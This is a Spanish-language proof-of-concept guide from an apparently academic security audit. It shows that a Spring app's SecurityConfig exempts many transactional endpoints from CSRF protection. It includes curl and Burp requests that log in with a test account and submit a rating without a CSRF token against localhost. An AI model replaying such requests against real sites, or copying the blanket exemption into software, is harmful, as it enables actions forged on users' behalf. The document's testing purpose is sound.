# Guía de Prueba de Concepto: PoC-03 — Cross-Site Request Forgery (CSRF) por Exclusiones Masivas

**Vulnerabilidad:** H-05 — Desactivación Masiva de Protección CSRF en Endpoints Transaccionales  
**CWE:** CWE-352 (Cross-Site Request Forgery)  
**OWASP Top 10:2021:** A01:2021 - Broken Access Control  
**Severidad:** Media  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
En `SecurityConfig.java:66-91`, el método `.ignoringRequestMatchers(...)` excluye más de 20 patrones de ruta transaccionales de la verificación de token CSRF, incluyendo `/api/guardar_reserva`, `/api/cancelar_reserva`, `/api/calificar`, `/api/admin/**` y `/api/agencia/**`. Cuando un usuario autenticado mantiene una cookie de sesión activa (`JSESSIONID`), una página externa puede inducir al navegador de la víctima a emitir peticiones `POST` o `PUT` contra dichos endpoints sin enviar la cabecera `X-XSRF-TOKEN` ni el token de formulario, ejecutando acciones no deseadas en nombre del usuario.

---

## 2. Precondiciones
1. App local levantada en `http://127.0.0.1:8080`.
2. Una sesión autenticada activa (por ejemplo, `turista_a@test.local`).

---

## 3. Procedimiento de Ejecución Manual (Demostración de Omisión de Token)

### Paso 1: Obtener una Sesión Válida con `curl`
```bash
curl -i -s -c cookies.txt -X POST "http://127.0.0.1:8080/api/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"correo":"turista_a@test.local","clave":"TestTurista#2026","rolEsperado":"TURISTA"}'
```

### Paso 2: Ejecutar una Acción Transaccional de Modificación de Estado SIN Cabecera `X-XSRF-TOKEN`
Enviar una petición de modificación o creación contra un endpoint sensible excluido de CSRF (por ejemplo `/api/calificar` o `/api/cancelar_reserva`), usando la cookie de sesión pero **omitiendo deliberadamente** el token CSRF:

```bash
curl -i -s -b cookies.txt -X POST "http://127.0.0.1:8080/api/calificar" \
     -H "Content-Type: application/json" \
     -d '{"idReserva":500,"idAgencia":1,"estrellas":4,"comentario":"Prueba CSRF sin token"}'
```

### Formato de Prueba para Burp Suite Repeater:
```http
POST /api/calificar HTTP/1.1
Host: 127.0.0.1:8080
Cookie: JSESSIONID=<PEGA_AQUÍ_LA_COOKIE_DE_SESIÓN>
Content-Type: application/json
Content-Length: 85
Connection: close

{"idReserva":500,"idAgencia":1,"estrellas":4,"comentario":"Prueba CSRF sin token"}
```
*(Nótese la ausencia total del header `X-XSRF-TOKEN`)*.

---

## 4. Respuesta Esperada
- **Código de Estado:** `200 OK`
- **Cuerpo de Respuesta:** `{"status":"success","message":"Calificación registrada con éxito"}`
- **Análisis de Seguridad:** Si la protección CSRF estuviese activa en este endpoint, Spring Security habría rechazado la petición inmediatamente con código **`403 Forbidden`** e indicando `"Invalid CSRF Token"` o `"Missing CSRF Token"`. Al responder `200 OK`, se demuestra que el endpoint acepta transacciones ciegas sin comprobación de origen ni token anti-falsificación.

---

## 5. Qué Capturar para el Informe Académico
1. **Burp Suite Repeater / Terminal:** Petición `POST /api/calificar` donde se aprecie la presencia de la cookie `JSESSIONID` y la **ausencia** de la cabecera `X-XSRF-TOKEN`, recibiendo respuesta `HTTP 200 OK`.
2. **Comparativa:** Captura del bloque `ignoringRequestMatchers` en `SecurityConfig.java` donde figura `/api/calificar` y `/api/admin/**`.

---

## 6. Resultado Real (Completar tras la prueba)
*(Espacio reservado para el evaluador)*

```text

```
